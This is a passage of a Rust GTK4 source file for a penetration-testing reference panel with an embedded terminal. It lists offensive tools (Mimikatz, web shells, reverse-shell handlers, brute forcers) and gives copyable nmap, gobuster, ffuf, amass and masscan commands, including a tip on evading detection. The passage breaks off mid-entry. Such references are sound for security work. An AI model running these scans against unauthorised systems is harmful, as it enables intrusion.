use gtk4::prelude::*;
use gtk4::glib;
use vte::prelude::*;
#[allow(deprecated)]
use gtk4::{
    Box as GtkBox, Button, ComboBoxText, Dialog, Frame, GestureClick, Label, Orientation,
    PopoverMenu, ResponseType, ScrolledWindow, Separator,
};
use std::process::Command;
use std::time::Duration;

/// Manual security tools panel with inline instructions and an embedded terminal
#[allow(deprecated)]
#[derive(Clone)]
pub struct ToolExecutionPanel {
    pub container: GtkBox,
    pub tool_selector: ComboBoxText,
    pub info_button: Button,
    pub instructions_scroll: ScrolledWindow,
    pub terminal: vte::Terminal,
}

#[allow(deprecated)]
impl ToolExecutionPanel {
    pub fn new() -> Self {
        let container = GtkBox::new(Orientation::Vertical, 12);
        container.set_margin_top(12);
        container.set_margin_bottom(12);
        container.set_margin_start(12);
        container.set_margin_end(12);

        // Header
        let header = Label::new(Some("Security Tool Reference"));
        header.add_css_class("title-3");
        container.append(&header);

        // Tool selector row
        let tool_box = GtkBox::new(Orientation::Horizontal, 8);
        let tool_label = Label::new(Some("Tool:"));
        tool_label.set_width_chars(10);
        tool_label.set_xalign(0.0);

        let tool_selector = ComboBoxText::new();
        // Reconnaissance Tools
        tool_selector.append(Some("amass"), "Amass - Asset Discovery");
        tool_selector.append(Some("sublist3r"), "Sublist3r - Subdomain Enumeration");
        tool_selector.append(Some("theHarvester"), "theHarvester - OSINT Gathering");
        tool_selector.append(Some("dnsrecon"), "DNSRecon - DNS Reconnaissance");
        tool_selector.append(Some("dnsenum"), "DNSenum - DNS Enumeration");
        tool_selector.append(Some("maltego"), "Maltego - Intelligence Platform");
        tool_selector.append(Some("recon-ng"), "Recon-ng - Web Recon Framework");
        tool_selector.append(Some("photon"), "Photon - Web Crawler");
        tool_selector.append(Some("spiderfoot"), "SpiderFoot - OSINT Automation");
        
        // Scanning & Enumeration Tools
        tool_selector.append(Some("nmap"), "Nmap - Port Scanner");
        tool_selector.append(Some("masscan"), "Masscan - Internet-scale Scanner");
        tool_selector.append(Some("naabu"), "Naabu - Fast Port Scanner");
        tool_selector.append(Some("nikto"), "Nikto - Web Scanner");
        tool_selector.append(Some("dirb"), "Dirb - Directory Brute Forcer");
        tool_selector.append(Some("gobuster"), "Gobuster - Directory/Subdomain Enum");
        tool_selector.append(Some("ffuf"), "ffuf - Fast Web Fuzzer");
        tool_selector.append(Some("wfuzz"), "Wfuzz - Web Fuzzer");
        tool_selector.append(Some("enum4linux"), "Enum4linux - SMB Enumeration");
        tool_selector.append(Some("smbmap"), "SMBMap - SMB Share Enumerator");
        tool_selector.append(Some("snmpwalk"), "SNMPwalk - SNMP Enumeration");
        tool_selector.append(Some("onesixtyone"), "Onesixtyone - SNMP Scanner");
        
        // Vulnerability Analysis Tools
        tool_selector.append(Some("sqlmap"), "sqlmap - SQL Injection");
        tool_selector.append(Some("sslyze"), "SSLyze - SSL/TLS Scanner");
        tool_selector.append(Some("testssl"), "TestSSL.sh - SSL/TLS Auditor");
        tool_selector.append(Some("wpscan"), "WPScan - WordPress Scanner");
        tool_selector.append(Some("joomscan"), "Joomscan - Joomla Scanner");
        tool_selector.append(Some("nuclei"), "Nuclei - Vulnerability Scanner");
        tool_selector.append(Some("lynis"), "Lynis - Security Audit");
        tool_selector.append(Some("unix-privesc-check"), "Unix-Privesc-Check - Priv Esc Scanner");
        
        // Exploitation Tools
        tool_selector.append(Some("metasploit"), "Metasploit Framework");
        tool_selector.append(Some("searchsploit"), "SearchSploit - Exploit Search");
        tool_selector.append(Some("commix"), "Commix - Command Injection");
        tool_selector.append(Some("weevely"), "Weevely - PHP Web Shell");
        tool_selector.append(Some("hydra"), "Hydra - Login Brute Force");
        tool_selector.append(Some("medusa"), "Medusa - Password Cracker");
        tool_selector.append(Some("ncrack"), "NCrack - Network Authentication Cracker");
        tool_selector.append(Some("patator"), "Patator - Multi-protocol Brute Forcer");
        tool_selector.append(Some("john"), "John the Ripper - Password Cracker");
        tool_selector.append(Some("hashcat"), "Hashcat - Password Recovery");
        tool_selector.append(Some("fcrackzip"), "FCrackZip - Zip Password Cracker");
        tool_selector.append(Some("pdfcrack"), "PDFCrack - PDF Password Recovery");
        
        // Post-Exploitation Tools
        tool_selector.append(Some("mimikatz"), "Mimikatz - Windows Credential Extractor");
        tool_selector.append(Some("pspy"), "Pspy - Linux Process Monitor");
        tool_selector.append(Some("chisel"), "Chisel - SOCKS Proxy");
        tool_selector.append(Some("ligolo-ng"), "Ligolo-ng - Network Tunneling");
        tool_selector.append(Some("pwncat"), "Pwncat - Reverse Shell Handler");
        tool_selector.append(Some("evil-winrm"), "Evil-WinRM - Windows Shell");
        tool_selector.append(Some("bloodhound-python"), "BloodHound-Python - AD Explorer");
        tool_selector.append(Some("impacket-scripts"), "Impacket Scripts");
        tool_selector.append(Some("powersploit"), "PowerSploit - PowerShell Toolkit");
        tool_selector.append(Some("empire"), "Empire - Post-Exploitation Framework");
        
        // Privilege Escalation Tools
        tool_selector.append(Some("linpeas"), "LinPEAS - Linux Priv Esc Scanner");
        tool_selector.append(Some("winpeas"), "WinPEAS - Windows Priv Esc Scanner");
        tool_selector.append(Some("linux-smart-enumeration"), "Linux Smart Enumeration");
        tool_selector.append(Some("linux-exploit-suggester"), "Linux Exploit Suggester");
        tool_selector.append(Some("windows-exploit-suggester"), "Windows Exploit Suggester");
        
        // Password Attack Tools (additional)
        tool_selector.append(Some("crunch"), "Crunch - Wordlist Generator");
        tool_selector.append(Some("cewl"), "CeWL - Custom Wordlist Generator");
        tool_selector.append(Some("hashid"), "HashID - Hash Identifier");
        
        // Wireless Attack Tools
        tool_selector.append(Some("aircrack-ng"), "Aircrack-ng - Wireless Security Suite");
        tool_selector.append(Some("kismet"), "Kismet - Wireless Network Detector");
        tool_selector.append(Some("reaver"), "Reaver - WPS Attack Tool");
        tool_selector.append(Some("bully"), "Bully - WPS Attack Tool");
        tool_selector.append(Some("wifite"), "Wifite - Automated Wireless Auditor");
        tool_selector.append(Some("mdk4"), "MDK4 - Wireless Attack Tool");
        
        // Web Application Tools (additional)
        tool_selector.append(Some("dirbuster"), "DirBuster - Web Content Scanner");
        tool_selector.append(Some("whatweb"), "WhatWeb - Web Technology Identifier");
        tool_selector.append(Some("wappalyzer"), "Wappalyzer - Technology Detector");
        tool_selector.append(Some("subjack"), "Subjack - Subdomain Takeover");
        
        // Network Sniffing & Spoofing Tools
        tool_selector.append(Some("wireshark"), "Wireshark - Network Analyzer");
        tool_selector.append(Some("tshark"), "TShark - CLI Network Analyzer");
        tool_selector.append(Some("tcpdump"), "TCPDump - Packet Analyzer");
        tool_selector.append(Some("ettercap"), "Ettercap - Network Sniffer");
        tool_selector.append(Some("driftnet"), "Driftnet - Image Sniffer");
        tool_selector.append(Some("dsniff"), "Dsniff - Password Sniffer");
        tool_selector.append(Some("mitmproxy"), "Mitmproxy - HTTPS Proxy");
        tool_selector.append(Some("bettercap"), "Bettercap - Network Attack Tool");
        
        // Maintaining Access Tools
        tool_selector.append(Some("sbd"), "SBD - Netcat Alternative");
        tool_selector.append(Some("cryptcat"), "Cryptcat - Encrypted Netcat");
        tool_selector.append(Some("dnscat2"), "DNScat2 - DNS Tunnel");
        
        // Steganography Tools
        tool_selector.append(Some("steghide"), "Steghide - Steganography Tool");
        tool_selector.append(Some("outguess"), "Outguess - Steganography Tool");
        tool_selector.append(Some("exiftool"), "ExifTool - Metadata Reader");
        tool_selector.append(Some("binwalk"), "Binwalk - Firmware Analyzer");
        tool_selector.append(Some("foremost"), "Foremost - File Carver");
        tool_selector.append(Some("strings"), "Strings - Text Extractor");
        
        // Forensic Tools (additional)
        tool_selector.append(Some("scalpel"), "Scalpel - File Carver");
        tool_selector.append(Some("bulk_extractor"), "Bulk Extractor - Forensic Analyzer");
        tool_selector.append(Some("xxd"), "XXD - Hex Dump");
        tool_selector.append(Some("hexedit"), "Hexedit - Hex Editor");
        
        // Reporting Tools
        tool_selector.append(Some("dradis"), "Dradis - Collaboration Platform");
        tool_selector.append(Some("faraday"), "Faraday - IDE for Pentesters");
        
        // Social Engineering Tools
        tool_selector.append(Some("setoolkit"), "Social Engineer Toolkit");
        
        // Hardware Hacking Tools
        tool_selector.append(Some("hackrf"), "HackRF - SDR Tool");
        tool_selector.append(Some("gqrx"), "GQRX - SDR Receiver");
        tool_selector.append(Some("gnuradio"), "GNU Radio - SDR Framework");
        tool_selector.append(Some("urh"), "Universal Radio Hacker");
        
        tool_selector.set_active_id(Some("nmap"));
        tool_selector.set_hexpand(true);

        let info_button = Button::with_label("Open Instructions Window");
        info_button.add_css_class("flat");

        tool_box.append(&tool_label);
        tool_box.append(&tool_selector);
        tool_box.append(&info_button);
        container.append(&tool_box);

        let notice = Label::new(Some(
            "Copy any command from the instructions below and paste it into the integrated terminal to run it manually.",
        ));
        notice.set_wrap(true);
        notice.set_xalign(0.0);
        notice.add_css_class("dim-label");
        container.append(&notice);

        // Instructions frame with scrolling content
        let instructions_frame = Frame::new(Some("Command Reference"));
        instructions_frame.set_hexpand(true);
        instructions_frame.set_vexpand(true);

        let instructions_scroll = ScrolledWindow::new();
        instructions_scroll.set_hexpand(true);
        instructions_scroll.set_vexpand(true);
        instructions_scroll.set_min_content_height(320);
        instructions_scroll.set_margin_top(8);
        instructions_scroll.set_margin_bottom(8);
        instructions_scroll.set_margin_start(8);
        instructions_scroll.set_margin_end(8);

        instructions_frame.set_child(Some(&instructions_scroll));
        container.append(&instructions_frame);

        // Embedded terminal setup
        let terminal_frame = gtk4::Frame::new(Some("Terminal"));
        let terminal_scroll = gtk4::ScrolledWindow::new();
        terminal_scroll.set_min_content_height(300);
        terminal_scroll.set_vexpand(true);
        terminal_scroll.set_hexpand(true);

        let terminal = vte::Terminal::new();
        terminal.set_scroll_on_output(true);
        terminal.set_scroll_on_keystroke(true);
        terminal.set_scrollback_lines(10000);
        terminal.set_mouse_autohide(true);

        let fg = gtk4::gdk::RGBA::new(0.9, 0.9, 0.9, 1.0);
        let bg = gtk4::gdk::RGBA::new(0.12, 0.12, 0.12, 1.0);
        terminal.set_color_foreground(&fg);
        terminal.set_color_background(&bg);

        let palette = [
            gtk4::gdk::RGBA::new(0.2, 0.2, 0.2, 1.0),
            gtk4::gdk::RGBA::new(0.8, 0.3, 0.3, 1.0),
            gtk4::gdk::RGBA::new(0.4, 0.8, 0.4, 1.0),
            gtk4::gdk::RGBA::new(0.8, 0.8, 0.3, 1.0),
            gtk4::gdk::RGBA::new(0.4, 0.7, 1.0, 1.0),
            gtk4::gdk::RGBA::new(0.8, 0.4, 0.8, 1.0),
            gtk4::gdk::RGBA::new(0.4, 0.8, 0.8, 1.0),
            gtk4::gdk::RGBA::new(0.85, 0.85, 0.85, 1.0),
            gtk4::gdk::RGBA::new(0.4, 0.4, 0.4, 1.0),
            gtk4::gdk::RGBA::new(1.0, 0.4, 0.4, 1.0),
            gtk4::gdk::RGBA::new(0.5, 1.0, 0.5, 1.0),
            gtk4::gdk::RGBA::new(1.0, 1.0, 0.5, 1.0),
            gtk4::gdk::RGBA::new(0.5, 0.8, 1.0, 1.0),
            gtk4::gdk::RGBA::new(1.0, 0.5, 1.0, 1.0),
            gtk4::gdk::RGBA::new(0.5, 1.0, 1.0, 1.0),
            gtk4::gdk::RGBA::new(1.0, 1.0, 1.0, 1.0),
        ];
        let palette_refs: Vec<&gtk4::gdk::RGBA> = palette.iter().collect();
        terminal.set_colors(Some(&fg), Some(&bg), &palette_refs);

        let right_click = GestureClick::new();
        right_click.set_button(3);

        let terminal_clone = terminal.clone();
        right_click.connect_pressed(move |_gesture, _n_press, x, y| {
            let menu = gtk4::gio::Menu::new();
            menu.append(Some("Copy"), Some("terminal.copy"));
            menu.append(Some("Paste"), Some("terminal.paste"));

            let popover = PopoverMenu::from_model(Some(&menu));
            popover.set_parent(&terminal_clone);
            popover.set_has_arrow(false);
            popover.set_pointing_to(Some(&gtk4::gdk::Rectangle::new(x as i32, y as i32, 1, 1)));

            let action_group = gtk4::gio::SimpleActionGroup::new();

            let copy_action = gtk4::gio::SimpleAction::new("copy", None);
            let terminal_copy = terminal_clone.clone();
            copy_action.connect_activate(move |_, _| {
                terminal_copy.copy_clipboard_format(vte::Format::Text);
            });
            action_group.add_action(&copy_action);

            let paste_action = gtk4::gio::SimpleAction::new("paste", None);
            let terminal_paste = terminal_clone.clone();
            paste_action.connect_activate(move |_, _| {
                terminal_paste.paste_clipboard();
            });
            action_group.add_action(&paste_action);

            terminal_clone.insert_action_group("terminal", Some(&action_group));
            popover.popup();
        });

        terminal.add_controller(right_click);

        terminal.spawn_async(
            vte::PtyFlags::DEFAULT,
            None,
            &["/bin/bash"],
            &[],
            glib::SpawnFlags::DEFAULT,
            || {},
            -1,
            None::<&gtk4::gio::Cancellable>,
            |result| {
                if let Err(e) = result {
                    eprintln!("Failed to spawn terminal: {}", e);
                }
            },
        );

        terminal_scroll.set_child(Some(&terminal));
        terminal_frame.set_child(Some(&terminal_scroll));
        container.append(&terminal_frame);

        let panel = Self {
            container,
            tool_selector,
            info_button,
            instructions_scroll,
            terminal,
        };

        panel.render_inline_instructions();

        let selector_clone = panel.tool_selector.clone();
        let panel_clone = panel.clone();
        selector_clone.connect_changed(move |_| {
            panel_clone.render_inline_instructions();
        });

        panel
    }

    pub fn get_selected_tool(&self) -> Option<String> {
        self.tool_selector.active_id().map(|s| s.to_string())
    }

    /// Rebuild inline instructions whenever the selected tool changes
    fn render_inline_instructions(&self) {
        let tool_id = self
            .get_selected_tool()
            .unwrap_or_else(|| "nmap".to_string());
        let instructions = get_tool_instructions(&tool_id);
        let content = build_instruction_sections(&instructions);
        self.instructions_scroll.set_child(Some(&content));
    }

    /// Show the instructions dialog for the selected tool
    pub fn show_instructions_dialog(&self, window: &gtk4::Window) {
        let tool_id = self
            .get_selected_tool()
            .unwrap_or_else(|| "nmap".to_string());
        let instructions = get_tool_instructions(&tool_id);

        let dialog = Dialog::with_buttons(
            Some(&format!("{} - Full Instructions", instructions.name)),
            Some(window),
            gtk4::DialogFlags::DESTROY_WITH_PARENT,
            &[("Close", ResponseType::Close)],
        );

        dialog.set_default_size(1000, 650);
        dialog.connect_response(|dialog, response| {
            if response == ResponseType::Close {
                dialog.close();
            }
        });

        let content = dialog.content_area();
        content.set_margin_top(12);
        content.set_margin_bottom(12);
        content.set_margin_start(12);
        content.set_margin_end(12);

        let scroll = ScrolledWindow::new();
        scroll.set_vexpand(true);
        scroll.set_hexpand(true);
        let instruction_box = build_instruction_sections(&instructions);
        scroll.set_child(Some(&instruction_box));
        content.append(&scroll);

        let window_title = format!("{} - Full Instructions", instructions.name);
        dialog.present();

        glib::timeout_add_local_once(Duration::from_millis(100), move || {
            let _ = Command::new("wmctrl")
                .args(["-r", &window_title, "-e", "0,0,0,-1,-1"])
                .output();

            let _ = Command::new("xdotool")
                .args(["search", "--name", &window_title, "windowmove", "0", "0"])
                .output();
        });
    }

    /// Write text to the terminal
    pub fn write_to_terminal(&self, text: &str) {
        self.terminal.feed(text.as_bytes());
    }

    /// Clear the terminal contents
    pub fn clear_terminal(&self) {
        self.terminal.reset(true, true);
    }

    /// Feed a command to the terminal (appends a newline)
    pub fn execute_in_terminal(&self, command: &str) {
        let full_command = format!("{}\n", command);
        self.terminal.feed(full_command.as_bytes());
    }
}

impl Default for ToolExecutionPanel {
    fn default() -> Self {
        Self::new()
    }
}

#[derive(Clone)]
struct ToolInstructions {
    name: String,
    description: &'static str,
    installation: Vec<String>,
    examples: Vec<ToolExample>,
    common_flags: Vec<ToolFlag>,
    tips: Vec<&'static str>,
}

#[derive(Clone)]
struct ToolExample {
    description: String,
    command: String,
}

#[derive(Clone)]
struct ToolFlag {
    flag: String,
    description: String,
}

fn build_instruction_sections(instructions: &ToolInstructions) -> GtkBox {
    let root = GtkBox::new(Orientation::Vertical, 12);
    root.set_margin_top(8);
    root.set_margin_bottom(8);
    root.set_margin_start(8);
    root.set_margin_end(8);

    let title = Label::new(Some(&format!("{}", instructions.name)));
    title.add_css_class("title-4");
    title.set_xalign(0.0);
    root.append(&title);

    let description = Label::new(Some(instructions.description));
    description.set_wrap(true);
    description.set_xalign(0.0);
    root.append(&description);

    let hint = Label::new(Some(
        "💡 Tip: Use the copy buttons next to actual commands. Comments and headings are not copyable.",
    ));
    hint.set_wrap(true);
    hint.set_xalign(0.0);
    hint.add_css_class("dim-label");
    root.append(&hint);

    if !instructions.installation.is_empty() {
        let frame = Frame::new(Some("Installation"));
        let install_box = GtkBox::new(Orientation::Vertical, 4);
        install_box.set_margin_top(8);
        install_box.set_margin_bottom(8);
        install_box.set_margin_start(8);
        install_box.set_margin_end(8);

        for line in &instructions.installation {
            match classify_instruction_line(line) {
                InstructionLine::Separator => {
                    let sep = Separator::new(Orientation::Horizontal);
                    sep.set_margin_top(4);
                    sep.set_margin_bottom(4);
                    install_box.append(&sep);
                }
                InstructionLine::Comment(text) => {
                    let label = create_instruction_label(text);
                    install_box.append(&label);
                }
                InstructionLine::Command(cmd) => {
                    let cmd_box = create_copyable_command_row(cmd);
                    install_box.append(&cmd_box);
                }
            }
        }

        frame.set_child(Some(&install_box));
        root.append(&frame);
    }

    if !instructions.examples.is_empty() {
        let frame = Frame::new(Some("Common Examples"));
        let example_box = GtkBox::new(Orientation::Vertical, 8);
        example_box.set_margin_top(8);
        example_box.set_margin_bottom(8);
        example_box.set_margin_start(8);
        example_box.set_margin_end(8);

        for example in &instructions.examples {
            let example_title = Label::new(Some(&format!("• {}", example.description)));
            example_title.set_xalign(0.0);
            example_title.set_wrap(true);
            example_title.add_css_class("heading");
            example_box.append(&example_title);

            let cmd_box = create_copyable_command_row(&example.command);
            cmd_box.set_margin_start(20);
            example_box.append(&cmd_box);
        }

        frame.set_child(Some(&example_box));
        root.append(&frame);
    }

    if !instructions.common_flags.is_empty() {
        let frame = Frame::new(Some("Helpful Flags"));
        let flags_box = GtkBox::new(Orientation::Vertical, 4);
        flags_box.set_margin_top(8);
        flags_box.set_margin_bottom(8);
        flags_box.set_margin_start(8);
        flags_box.set_margin_end(8);

        for flag in &instructions.common_flags {
            let label = Label::new(Some(&format!("{} — {}", flag.flag, flag.description)));
            label.set_xalign(0.0);
            label.set_wrap(true);
            flags_box.append(&label);
        }

        frame.set_child(Some(&flags_box));
        root.append(&frame);
    }

    if !instructions.tips.is_empty() {
        let frame = Frame::new(Some("Tips & Best Practices"));
        let tips_box = GtkBox::new(Orientation::Vertical, 4);
        tips_box.set_margin_top(8);
        tips_box.set_margin_bottom(8);
        tips_box.set_margin_start(8);
        tips_box.set_margin_end(8);

        for tip in &instructions.tips {
            let label = Label::new(Some(&format!("💡 {}", tip)));
            label.set_xalign(0.0);
            label.set_wrap(true);
            tips_box.append(&label);
        }

        frame.set_child(Some(&tips_box));
        root.append(&frame);
    }

    root
}

fn create_instruction_label(text: &str) -> Label {
    let label = Label::new(Some(text));
    label.set_xalign(0.0);
    label.set_wrap(true);
    label.add_css_class("dim-label");
    label
}

fn create_copyable_command_row(command: &str) -> GtkBox {
    let row = GtkBox::new(Orientation::Horizontal, 8);

    let cmd_label = Label::new(Some(command));
    cmd_label.set_selectable(true);
    cmd_label.set_xalign(0.0);
    cmd_label.set_hexpand(true);
    cmd_label.set_wrap(true);
    cmd_label.add_css_class("monospace");

    let command_text = command.to_string();
    let copy_button = Button::with_label("📋 Copy");
    copy_button.add_css_class("flat");
    copy_button.set_tooltip_text(Some("Copy full command to clipboard"));
    copy_button.connect_clicked(move |_| {
        if let Some(display) = gtk4::gdk::Display::default() {
            let clipboard = display.clipboard();
            clipboard.set_text(&command_text);
        }
    });

    row.append(&cmd_label);
    row.append(&copy_button);
    row
}

enum InstructionLine<'a> {
    Comment(&'a str),
    Command(&'a str),
    Separator,
}

fn classify_instruction_line(line: &str) -> InstructionLine<'_> {
    let trimmed = line.trim();
    if trimmed.is_empty() {
        InstructionLine::Separator
    } else if trimmed.starts_with('#') {
        InstructionLine::Comment(trimmed)
    } else {
        InstructionLine::Command(line)
    }
}

fn get_tool_instructions(tool_id: &str) -> ToolInstructions {
    match tool_id {
        "nmap" => ToolInstructions {
            name: "Nmap".to_string(),
            description: "Nmap (Network Mapper) is a powerful open-source tool for network discovery and security auditing. It discovers hosts, detects services, fingerprints OS metadata, and can execute NSE scripts for deeper checks.",
            installation: vec![
                "# Debian/Ubuntu",
                "sudo apt install nmap",
                "",
                "# Red Hat/CentOS/Fedora",
                "sudo yum install nmap",
                "",
                "# macOS (Homebrew)",
                "brew install nmap",
            ]
            .into_iter()
            .map(|s| s.to_string())
            .collect(),
            examples: vec![
                ToolExample {
                    description: "Basic TCP SYN scan (fast, stealthy)".to_string(),
                    command: "sudo nmap -sS scanme.nmap.org".to_string(),
                },
                ToolExample {
                    description: "Scan specific ports with version detection".to_string(),
                    command: "sudo nmap -p 80,443 -sV example.com".to_string(),
                },
                ToolExample {
                    description: "Aggressive scan (OS detection, scripts, traceroute)".to_string(),
                    command: "sudo nmap -A 192.168.1.1".to_string(),
                },
                ToolExample {
                    description: "Host discovery without port scan".to_string(),
                    command: "sudo nmap -sn 192.168.1.0/24".to_string(),
                },
                ToolExample {
                    description: "Full TCP scan with service detection".to_string(),
                    command: "sudo nmap -p- -sV 10.0.0.5".to_string(),
                },
            ],
            common_flags: vec![
                ToolFlag { flag: "-sS".to_string(), description: "TCP SYN scan (default, stealthy)".to_string() },
                ToolFlag { flag: "-sV".to_string(), description: "Service version detection".to_string() },
                ToolFlag { flag: "-O".to_string(), description: "OS detection".to_string() },
                ToolFlag { flag: "-A".to_string(), description: "Aggressive scan (OS, version, scripts, traceroute)".to_string() },
                ToolFlag { flag: "-p <ports>".to_string(), description: "List ports or ranges (e.g., -p 80,443 or -p 1-1000)".to_string() },
                ToolFlag { flag: "-T<0-5>".to_string(), description: "Timing template (0=slowest, 5=fastest)".to_string() },
                ToolFlag { flag: "--script <name>".to_string(), description: "Run NSE script (e.g., --script vuln)".to_string() },
                ToolFlag { flag: "-oN/-oX/-oG".to_string(), description: "Output to normal/XML/grepable files".to_string() },
            ],
            tips: vec![
                "Always run scans with permission and document scope clearly.",
                "Use -T4 for faster scans on reliable networks; -T2 when evading detection.",
                "Combine flags: sudo nmap -sS -sV -O -T4 target",
                "Enable verbose output with -v or --reason to inspect why ports are marked open or closed.",
                "Schedule long-running scans during maintenance windows to avoid network noise.",
            ],
        },
        "gobuster" => ToolInstructions {
            name: "Gobuster".to_string(),
            description: "Gobuster is a multithreaded directory, DNS, and virtual host brute-forcing tool. It is perfect for quickly finding hidden web content when you already know the hostname or base URL.",
            installation: vec![
                "# Debian/Ubuntu",
                "sudo apt install gobuster",
                "",
                "# Install via Go",
                "go install github.com/OJ/gobuster/v3@latest",
                "",
                "# Manual download",
                "wget https://github.com/OJ/gobuster/releases/download/v3.6.0/gobuster_Linux_x86_64.tar.gz",
                "tar -xzf gobuster_Linux_x86_64.tar.gz",
                "sudo mv gobuster /usr/local/bin/",
            ]
            .into_iter()
            .map(|s| s.to_string())
            .collect(),
            examples: vec![
                ToolExample {
                    description: "Directory/file brute-forcing (dir mode)".to_string(),
                    command: "gobuster dir -u http://example.com -w data/wordlists/common.txt".to_string(),
                },
                ToolExample {
                    description: "DNS subdomain enumeration".to_string(),
                    command: "gobuster dns -d example.com -w data/wordlists/subdomains.txt".to_string(),
                },
                ToolExample {
                    description: "Virtual host discovery".to_string(),
                    command: "gobuster vhost -u http://example.com -w data/wordlists/vhosts.txt".to_string(),
                },
                ToolExample {
                    description: "Directory scan with extensions and status filters".to_string(),
                    command: "gobuster dir -u https://example.com -w data/wordlists/common.txt -x php,txt,bak -s 200,204,301,302,403".to_string(),
                },
                ToolExample {
                    description: "Authenticated scan with cookies".to_string(),
                    command: "gobuster dir -u https://portal.example.com -w data/wordlists/common.txt -c 'session=abcd1234'".to_string(),
                },
            ],
            common_flags: vec![
                ToolFlag { flag: "dir/dns/vhost".to_string(), description: "Choose directory, DNS, or virtual host mode".to_string() },
                ToolFlag { flag: "-u/-d".to_string(), description: "Target base URL (-u) or domain (-d)".to_string() },
                ToolFlag { flag: "-w <wordlist>".to_string(), description: "Path to the wordlist file".to_string() },
                ToolFlag { flag: "-x <extensions>".to_string(), description: "Comma-separated extensions to append".to_string() },
                ToolFlag { flag: "-t <threads>".to_string(), description: "Adjust concurrency (default 10)".to_string() },
                ToolFlag { flag: "-s/-b".to_string(), description: "Positive (-s) or blacklist (-b) status codes".to_string() },
                ToolFlag { flag: "-a/-c/-H".to_string(), description: "Set User-Agent (-a), cookies (-c), or custom header (-H)".to_string() },
                ToolFlag { flag: "--delay".to_string(), description: "Add delay between requests to avoid throttling".to_string() },
            ],
            tips: vec![
                "Use smaller wordlists first to confirm interesting responses, then scale up.",
                "Leverage PT Journal wordlists in data/wordlists/ or swap in SecLists.",
                "Always review HTTP status codes; -s 200,204,301,302,307,401,403 keeps useful hits.",
                "Add -x php,asp,bak for common backup files.",
                "Combine Gobuster output with proxy logs for deeper insights.",
            ],
        },
        "ffuf" => ToolInstructions {
            name: "ffuf".to_string(),
            description: "ffuf (Fuzz Faster U Fool) is a blazing fast web fuzzer for discovering files, directories, parameters, and virtual hosts. It supports advanced filters to quickly isolate meaningful responses.",
            installation: vec![
                "# Debian/Ubuntu",
                "sudo apt install ffuf",
                "",
                "# Install via Go",
                "go install github.com/ffuf/ffuf@latest",
                "",
                "# Manual build",
                "git clone https://github.com/ffuf/ffuf.git",
                "cd ffuf && go build",
            ]
            .into_iter()
            .map(|s| s.to_string())
            .collect(),
            examples: vec![
                ToolExample {
                    description: "Directory fuzzing".to_string(),
                    command: "ffuf -w data/wordlists/common.txt -u https://target/FUZZ".to_string(),
                },
                ToolExample {
                    description: "Parameter fuzzing".to_string(),
                    command: "ffuf -w params.txt -u 'https://target/search?FUZZ=test'".to_string(),
                },
                ToolExample {
                    description: "Find virtual hosts".to_string(),
                    command: "ffuf -w subdomains.txt -u http://target/ -H 'Host: FUZZ.target'".to_string(),
                },
                ToolExample {
                    description: "Filter by response size".to_string(),
                    command: "ffuf -w common.txt -u https://target/FUZZ -fs 0".to_string(),
                },
                ToolExample {
                    description: "Recursive fuzzing".to_string(),
                    command: "ffuf -w common.txt -u https://target/FUZZ -recursion -recursion-depth 2".to_string(),
                },
            ],
            common_flags: vec![
                ToolFlag { flag: "-w <wordlist>".to_string(), description: "Wordlist path".to_string() },
                ToolFlag { flag: "-u <url>".to_string(), description: "Target URL (use FUZZ keyword)".to_string() },
                ToolFlag { flag: "-H/-b".to_string(), description: "Inject headers or cookies".to_string() },
                ToolFlag { flag: "-recursion".to_string(), description: "Automatically revisit discovered paths".to_string() },
                ToolFlag { flag: "-mc/-fc".to_string(), description: "Filter by match or filter status codes".to_string() },
                ToolFlag { flag: "-fs/-fw".to_string(), description: "Filter by size (bytes) or words".to_string() },
                ToolFlag { flag: "-t/-p".to_string(), description: "Threads (-t) and delay (-p)".to_string() },
                ToolFlag { flag: "-o <file>".to_string(), description: "Write JSON output".to_string() },
            ],
            tips: vec![
                "Mark every location to fuzz with FUZZ (URL paths, headers, POST data).",
                "Use -ic to ignore wordlist comments when using SecLists.",
                "Stack filters (e.g., -mc 200 -fs 0) to hide noise quickly.",
                "Throttle threads (-t) for fragile targets or WAFs.",
                "Store results (-o output.json) for later analysis or reporting.",
            ],
        },
        "amass" => ToolInstructions {
            name: "Amass".to_string(),
            description: "OWASP Amass performs in-depth attack surface mapping for external assets. It combines passive and active reconnaissance with graph exports and historical tracking.",
            installation: vec![
                "# Snap package",
                "sudo snap install amass",
                "",
                "# Install via Go",
                "GO111MODULE=on go install -v github.com/owasp-amass/amass/v4/...",
                "",
                "# Docker",
                "docker pull caffix/amass",
            ]
            .into_iter()
            .map(|s| s.to_string())
            .collect(),
            examples: vec![
                ToolExample {
                    description: "Passive enumeration".to_string(),
                    command: "amass enum -passive -d example.com".to_string(),
                },
                ToolExample {
                    description: "Active brute-force with wordlist".to_string(),
                    command: "amass enum -active -brute -w data/wordlists/subdomains.txt -d example.com".to_string(),
                },
                ToolExample {
                    description: "ASN and netblock intel".to_string(),
                    command: "amass intel -asn 13335".to_string(),
                },
                ToolExample {
                    description: "Graph export".to_string(),
                    command: "amass viz -d example.com -o graph.gexf".to_string(),
                },
                ToolExample {
                    description: "Track changes over time".to_string(),
                    command: "amass track -d example.com".to_string(),
                },
            ],
            common_flags: vec![
                ToolFlag { flag: "enum/intel/viz/db/track".to_string(), description: "Module to run".to_string() },
                ToolFlag { flag: "-d/-df".to_string(), description: "Target domain or file with multiple domains".to_string() },
                ToolFlag { flag: "-brute".to_string(), description: "Enable brute-force enumeration".to_string() },
                ToolFlag { flag: "-src".to_string(), description: "Show data sources for findings".to_string() },
                ToolFlag { flag: "-ip".to_string(), description: "Include resolved IP addresses".to_string() },
                ToolFlag { flag: "-o/-json".to_string(), description: "Write results to text or JSON".to_string() },
            ],
            tips: vec![
                "Configure API keys (~/.config/amass/config.ini) for richer passive data.",
                "Use amass db to reuse previous discoveries during new engagements.",
                "Export graphs (viz) to share with teammates or include in reports.",
                "Blend passive + active modes for accuracy while limiting noise.",
            ],
        },
        "masscan" => ToolInstructions {
            name: "Masscan".to_string(),
            description: "Masscan is an Internet-scale port scanner capable of sending millions of packets per second. Use it for rapid discovery before deeper Nmap scans.",
            installation: vec![
                "# Debian/Ubuntu",
                "sudo apt install masscan",
                "",
                "# Build from source",
                "git clone https://github.com/robertdavidgraham/masscan.git",
                "cd masscan && make",
            ]
            .into_iter()
            .map(|s| s.to_string())
            .collect(),
            examples: vec![
                ToolExample {
                    description: "Scan top 100 ports on a subnet".to_string(),
                    command: "sudo masscan 10.0.0.0/24 --top-ports 100 --rate 5000".to_string(),
                },
                ToolExample {
                    description: "Full TCP scan of a host".to_string(),
